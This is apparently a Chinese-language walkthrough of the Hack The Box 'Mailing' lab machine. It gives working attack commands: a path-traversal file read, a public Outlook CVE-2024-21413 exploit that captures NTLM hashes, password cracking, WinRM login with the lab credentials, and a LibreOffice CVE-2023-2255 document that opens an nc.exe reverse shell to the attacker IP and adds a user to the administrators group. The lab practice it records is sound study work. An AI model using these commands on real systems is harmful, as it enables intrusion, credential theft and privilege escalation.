![image-20241017234558326](https://s2.loli.net/2024/10/17/9Eqi2xunMHB6GZT.png)

考虑到使用的是php，且具备参数？file，考虑是否存在文件包含漏洞，考虑到服务端是Windows系统，根据IIS判断出来，我们尝试访问hosts文件进行验证

```
curl 'http://mailing.htb/download.php?file=..\\..\\windows\\system32\\drivers\\etc\\hosts'
```

![image-20241018000210835](https://s2.loli.net/2024/10/18/ZgAWVlnahG9SbYR.png)

成功进行了读取，尝试是否可以远程包含，尝试之后不行，只能够进行本地文件包含，根据这点我们考虑如何利用本地文件包含进行突破，经过一番查找，通过hmailserver config path 关键字查到以下内容

![image-20241018003101702](https://s2.loli.net/2024/10/18/PA8Vc7mDJZsMyFr.png)

尝试是否存在且可以读取对应ini文件

验证能够成功登录

这一步我们考虑mail本身存在的漏洞，进行了很多尝试，考虑到安装文档中的Windows mail客户端，最终搜索到一个poc（https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability）可以帮助我们实现RCE

```
sudo impacket-smbserver share . -smb2support
python3 CVE-2024-21413.py --server "mailing.htb" --port "587" --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "123@mailing.htb" --recipient "maya@mailing.htb" --url "\\10.10.16.12\share\test.txt" --subject "exploit"
```

![image-20241018134640763](https://files.seeusercontent.com/2026/04/06/vNm0/image-20241018134640763.png)

我们能够在侦听端获取一个NTLMv2哈希值，对其进行破解后获取到对应的用户密码

```
sudo john hash3 --wordlist=/usr/share/wordlists/rockyou.txt

user:maya
pass:m4y4ngs4ri
```

![image-20241018134725179](https://s2.loli.net/2024/10/18/lpOkG3Mi2DINWxu.png)

考虑到服务端存在winrm服务，通过netexec进行验证

```
netexec winrm 10.10.11.14 -u maya -p 'm4y4ngs4ri'
```

![image-20241018110834946](https://s2.loli.net/2024/10/18/EsUdPN6CIjBetKo.png)

能够成功进行登录，使用evilwinrm进行登录，成功获取对应flag

```
evil-winrm -i mailing.htb -u maya -p 'm4y4ngs4ri'
```

接下来我们需要提权，优先查看用户

```
net localgroup Administratadores
```



![image-20241018112638277](https://s2.loli.net/2024/10/18/zb8oynqW3pmMkZK.png)

我们将逐个查看文件夹，我们在程序文件夹下有一个libreoffice，获取对应的版本ID

```
dir -recurse *.ini
```

![image-20241018113516866](https://s2.loli.net/2024/10/18/IOqjGTsbnc32S5U.png)

对应版本存在一个漏洞https://github.com/elweth-sec/CVE-2023-2255

经过对这个CVE的的查看，相应cmd后可以执行命令，然后生成一个libreoffice的文件，如果服务端有人打开这个文件，就会反弹shell给到服务器

优先在服务端上传一个nc.exe

```
upload nc.exe
```

```
python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\users\maya\nc.exe 10.10.16.12 12345 -e cmd.exe' --output 'exploit.odt'

upload exploit.odt
./exploit.odt
```

然后等待shell反弹

![image-20241018151324901](https://s2.loli.net/2024/10/18/h785SZOsNyrm4wb.png)

返回的权限依然是maya，考虑另外一种方法

```
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit3.odt'
./exploit3.odt
```
